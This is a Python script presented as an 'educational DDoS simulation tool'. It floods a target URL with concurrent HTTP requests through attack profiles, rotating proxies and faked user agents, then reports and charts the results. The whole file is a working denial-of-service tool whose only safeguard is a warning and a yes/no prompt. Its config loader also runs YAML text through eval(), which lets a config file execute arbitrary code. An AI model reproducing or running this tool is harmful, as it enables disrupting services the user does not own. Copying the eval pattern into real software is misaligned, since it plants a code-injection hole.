import asyncio
import aiohttp
import time
import random
import argparse
import json
import logging
import yaml
from faker import Faker
from dataclasses import dataclass, asdict
from typing import Dict, List, Optional, Union
from tqdm.asyncio import tqdm
import matplotlib.pyplot as plt
from colorama import init, Fore, Style
import sys
from pathlib import Path
import aiohttp_socks
from aiohttp import ClientSession
from concurrent.futures import ThreadPoolExecutor

# Initialize colorama for colored terminal output
init()

# Setup logging
logging.basicConfig(
    filename="ddos_simulation.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    filemode='a'
)

fake = Faker()

@dataclass
class AttackProfile:
    """Defines an attack profile with request characteristics."""
    name: str
    methods: List[str]
    headers: Dict[str, Union[str, callable]]
    payload_generator: callable
    delay_variance: float
    rate_limit: float  # Added per-profile rate limiting
    
    @classmethod
    def from_dict(cls, data: Dict) -> 'AttackProfile':
        """Creates an AttackProfile from a dictionary."""
        return cls(
            name=data["name"],
            methods=data["methods"],
            headers=data["headers"],
            payload_generator=eval(data["payload_generator"]),  # Be cautious with eval in production
            delay_variance=data["delay_variance"],
            rate_limit=data["rate_limit"]
        )

    def generate_request(self, request_id: int, url: str, proxies: Optional[List[str]] = None) -> Dict:
        """Generates a single request based on the profile."""
        method = random.choice(self.methods)
        headers = {k: v() if callable(v) else v for k, v in self.headers.items()}
        payload = self.payload_generator()
        proxy = random.choice(proxies) if proxies else None
        return {
            "id": request_id,
            "method": method,
            "url": url,
            "headers": headers,
            "payload": payload,
            "delay_variance": self.delay_variance,
            "rate_limit": self.rate_limit,
            "proxy": proxy
        }

# Predefined Attack Profiles
DEFAULT_PROFILES = {
    "normal": AttackProfile(
        name="Normal Traffic",
        methods=["GET"],
        headers={"User-Agent": lambda: fake.user_agent(), "Accept": "*/*"},
        payload_generator=lambda: None,
        delay_variance=0.1,
        rate_limit=0.1
    ),
    "api_stress": AttackProfile(
        name="API Stress",
        methods=["POST", "PUT"],
        headers={"User-Agent": lambda: fake.user_agent(), "Content-Type": "application/json"},
        payload_generator=lambda: json.dumps({"id": random.randint(1, 1000), "data": fake.text(max_nb_chars=200)}),
        delay_variance=0.05,
        rate_limit=0.05
    ),
    "heavy_load": AttackProfile(
        name="Heavy Load",
        methods=["POST"],
        headers={"User-Agent": lambda: fake.user_agent(), "Content-Length": "1024"},
        payload_generator=lambda: fake.text(max_nb_chars=1024),
        delay_variance=0.02,
        rate_limit=0.01
    )
}

class Metrics:
    """Tracks and summarizes attack metrics."""
    def __init__(self):
        self.success = 0
        self.failure = 0
        self.response_times = []
        self.status_codes = {}
        self.lock = asyncio.Lock()

    async def record(self, success: bool, response_time: float, status_code: Optional[int] = None):
        """Records the outcome of a request."""
        async with self.lock:
            if success:
                self.success += 1
            else:
                self.failure += 1
            self.response_times.append(response_time)
            if status_code:
                self.status_codes[status_code] = self.status_codes.get(status_code, 0) + 1

    def summary(self) -> Dict:
        """Returns a summary of collected metrics."""
        total = self.success + self.failure
        avg_time = sum(self.response_times) / len(self.response_times) if self.response_times else 0
        return {
            "total_requests": total,
            "successful_requests": self.success,
            "failed_requests": self.failure,
            "success_rate": (self.success / total) * 100 if total > 0 else 0,
            "avg_response_time": avg_time,
            "min_response_time": min(self.response_times or [0]),
            "max_response_time": max(self.response_times or [0]),
            "response_times": self.response_times,
            "status_codes": self.status_codes
        }

def save_metrics_report(metrics: Dict, filename: str = "attack_report.json"):
    """Saves metrics to a JSON file."""
    with open(filename, 'w') as f:
        json.dump(metrics, f, indent=4)
    print(f"{Fore.GREEN}Metrics report saved as '{filename}'{Style.RESET_ALL}")

def plot_metrics(metrics: Dict, output_file: str = "attack_response_times.png"):
    """Generates and saves a histogram of response times and status code pie chart."""
    fig, (ax1, ax2) = plt.subplots(1, 2, figsize=(16, 6))

    # Response Time Histogram
    ax1.hist(metrics["response_times"], bins=30, color='red', alpha=0.7, edgecolor='black')
    ax1.set_title("Response Time Distribution", fontsize=14)
    ax1.set_xlabel("Time (seconds)", fontsize=12)
    ax1.set_ylabel("Frequency", fontsize=12)
    ax1.grid(True, alpha=0.3)

    # Status Code Pie Chart
    if metrics["status_codes"]:
        labels = [f"{code} ({count})" for code, count in metrics["status_codes"].items()]
        sizes = list(metrics["status_codes"].values())
        ax2.pie(sizes, labels=labels, autopct='%1.1f%%', startangle=90)
        ax2.set_title("Status Code Distribution", fontsize=14)
    
    plt.tight_layout()
    plt.savefig(output_file)
    print(f"{Fore.GREEN}Plots saved as '{output_file}'{Style.RESET_ALL}")

async def send_request(session: ClientSession, req: Dict, metrics: Metrics, semaphore: asyncio.Semaphore, progress: tqdm):
    """Sends a single HTTP request with semaphore-based concurrency control."""
    async with semaphore:
        try:
            start_time = time.time()
            async with session.request(
                method=req["method"],
                url=req["url"],
                headers=req["headers"],
                data=req["payload"],
                timeout=aiohttp.ClientTimeout(total=5),
                proxy=req["proxy"]
            ) as response:
                elapsed_time = time.time() - start_time
                success = response.status in (200, 201)
                await metrics.record(success, elapsed_time, response.status)
                logging.info(f"Request {req['id']}: {req['method']} {req['url']} - Status {response.status} - Time {elapsed_time:.3f}s")
        except (aiohttp.ClientError, aiohttp_socks.SocksError) as e:
            elapsed_time = time.time() - start_time
            await metrics.record(False, elapsed_time)
            logging.error(f"Request {req['id']}: {req['method']} {req['url']} - Failed - Error: {str(e)}")
        except asyncio.TimeoutError:
            elapsed_time = time.time() - start_time
            await metrics.record(False, elapsed_time)
            logging.error(f"Request {req['id']}: {req['method']} {req['url']} - Timeout")
        finally:
            progress.update(1)
            await asyncio.sleep(req["rate_limit"] + random.uniform(0, req["delay_variance"]))

async def run_attack(url: str, request_count: int, concurrency: int, profile_name: str, proxies: Optional[List[str]] = None):
    """Runs the DDoS simulation with the specified parameters."""
    metrics = Metrics()
    profile = DEFAULT_PROFILES.get(profile_name, DEFAULT_PROFILES["normal"])
    requests_list = [profile.generate_request(i, url, proxies) for i in range(1, request_count + 1)]
    semaphore = asyncio.Semaphore(concurrency)

    print(f"{Fore.CYAN}\nStarting DDoS simulation on {url}{Style.RESET_ALL}")
    print(f"Profile: {profile.name}, Requests: {request_count}, Concurrency: {concurrency}")

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0)) as session:
        async with tqdm(total=request_count, desc="Attack Progress", unit="req", colour="green") as progress:
            tasks = [send_request(session, req, metrics, semaphore, progress) for req in requests_list]
            await asyncio.gather(*tasks)

    return metrics

def load_config(config_file: str) -> Dict:
    """Loads attack profiles from a YAML configuration file."""
    if not Path(config_file).exists():
        return {}
    with open(config_file, 'r') as f:
        config = yaml.safe_load(f)
    custom_profiles = {p["name"]: AttackProfile.from_dict(p) for p in config.get("profiles", [])}
    return custom_profiles

def execute_attack(url: str, request_count: int, concurrency: int, profile_name: str, proxies: Optional[List[str]] = None, config_file: Optional[str] = None):
    """Executes the attack and displays results."""
    global DEFAULT_PROFILES
    if config_file:
        custom_profiles = load_config(config_file)
        DEFAULT_PROFILES.update(custom_profiles)

    start_time = time.time()
    try:
        metrics = asyncio.run(run_attack(url, request_count, concurrency, profile_name, proxies))
    except Exception as e:
        print(f"{Fore.RED}Attack failed: {str(e)}{Style.RESET_ALL}")
        logging.critical(f"Attack execution failed: {str(e)}")
        return

    total_time = time.time() - start_time
    summary = metrics.summary()

    print(f"\n{Fore.YELLOW}=== DDoS Simulation Summary ==={Style.RESET_ALL}")
    print("Developed by It Is Unique Official")
    for key, value in summary.items():
        if key not in ("response_times", "status_codes"):
            print(f"{key.replace('_', ' ').title()}: {value:.2f}" if isinstance(value, float) else f"{key.replace('_', ' ').title()}: {value}")
    print(f"Status Codes: {summary['status_codes']}")
    print(f"Total Time Taken: {total_time:.2f}s")

    save_metrics_report(summary)
    plot_metrics(summary)
    logging.info(f"Attack completed in {total_time:.2f}s with profile {profile_name}")

def main():
    """CLI entry point for the DDoS simulation tool."""
    parser = argparse.ArgumentParser(
        description="Network-DDoS: Educational DDoS Simulation Tool by It Is Unique Official",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("--url", required=True, help="Target URL to simulate attack on")
    parser.add_argument("--requests", type=int, default=500, help="Number of requests to send")
    parser.add_argument("--concurrency", type=int, default=50, help="Number of concurrent connections")
    parser.add_argument("--profile", default="normal", help="Attack profile to use (default or from config)")
    parser.add_argument("--proxies", nargs="*", help="List of proxy URLs (e.g., http://proxy:port)")
    parser.add_argument("--config", help="Path to YAML config file with custom profiles")

    args = parser.parse_args()

    print(f"{Fore.RED}\nWARNING: This tool is for EDUCATIONAL PURPOSES ONLY.{Style.RESET_ALL}")
    print("Use it only on servers you own or have explicit permission to test.")
    print("Unauthorized use is illegal and unethical.\n")

    confirm = input(f"{Fore.YELLOW}Do you have permission to test {args.url}? (yes/no): {Style.RESET_ALL}")
    if confirm.lower() != "yes":
        print(f"{Fore.RED}Aborting simulation.{Style.RESET_ALL}")
        sys.exit(1)

    execute_attack(args.url, args.requests, args.concurrency, args.profile, args.proxies, args.config)

if __name__ == "__main__":
    main()
